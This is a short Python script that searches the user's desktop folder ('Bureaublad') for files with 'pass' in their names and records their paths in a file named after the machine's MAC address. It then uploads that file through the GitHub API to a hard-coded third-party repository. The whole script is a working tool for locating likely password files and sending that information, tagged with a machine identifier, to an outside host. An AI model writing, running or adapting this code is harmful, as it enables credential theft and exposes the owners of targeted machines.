import os
import subprocess
import platform
import re
import socket
import urllib.request
import base64
import json

def get_mac_address():
    try:
        if platform.system() == 'Windows':
            command = 'ipconfig /all'
            pattern = re.compile(r'Physical Address[\. ]+: ([\w-]+)')
        else:
            command = 'ifconfig'
            pattern = re.compile(r'ether ([\w:]+)')

        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            output_lines = result.stdout.split('\n')
            for line in output_lines:
                match = pattern.search(line)
                if match:
                    mac_address = match.group(1)
                    return mac_address.replace("-", ":") 
        else:
            print("Error:", result.stderr)
            return None
    except Exception as e:
        print("Error occurred while retrieving MAC address:", e)
        return None

def search_files(directory):
    found_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if "pass" in file.lower():
                file_path = os.path.join(root, file)
                found_files.append(file_path)
    return found_files

def write_to_file(file_path, file_paths):
    with open(file_path, 'w') as f:
        for path in file_paths:
            f.write(path + '\n')

def function_githubreq(file_path):
    repo_owner = 'jonas638'
    repo_name = 'testingxd'
    
    access_token = '' # use token here
    base_url = 'https://api.github.com'

    with open(file_path, 'r') as f:
        file_content = f.read()
    encoded_content = base64.b64encode(file_content.encode()).decode()

    commit_message = 'Update pass file search results'

    data = {
        "message": commit_message,
        "content": encoded_content
    }

    headers = {
        "Authorization": f"token {access_token}",
        "Content-Type": "application/json",
        "Accept": "application/vnd.github.v3+json"
    }

    request = urllib.request.Request(
        f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{file_path}",
        method='GET',
        headers=headers
    )
    try:
        with urllib.request.urlopen(request) as response:
            existing_file = json.loads(response.read().decode())
            sha = existing_file['sha']
    except urllib.error.HTTPError as e:
        if e.code == 404:
            sha = None
        else:
            raise

    if sha is not None:
        data['sha'] = sha 

    data_json = json.dumps(data).encode()

    request = urllib.request.Request(
        f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{file_path}",
        method='PUT',
        headers=headers,
        data=data_json
    )
    try:
        with urllib.request.urlopen(request) as response:
            if response.status == 200:
                print("File updated successfully.")
            else:
                print("Failed to update file.")
                print(response.read().decode())
    except urllib.error.HTTPError as e:
        print(f"HTTP Error {e.code}: {e.reason}")

if __name__ == "__main__":
    desktop_directory = os.path.join(os.path.expanduser("~"), "Bureaublad")

    print("Searching for files containing 'pass' in their name on the desktop...")
    found_files = search_files(desktop_directory)

    if found_files:
        print("Found the following files containing 'pass' in their name:")
        for file in found_files:
            print(file)
    else:
        print("No files containing 'pass' in their name were found.")
    
    mac_address = get_mac_address()
    if mac_address:
        file_name = f"{mac_address.replace(':', '_')}_pass.txt"
        write_to_file(file_name, found_files)
        print(f"File paths written to {file_name}.")

       
        function_githubreq(file_name)
    else:
        print("Failed to retrieve MAC address.")
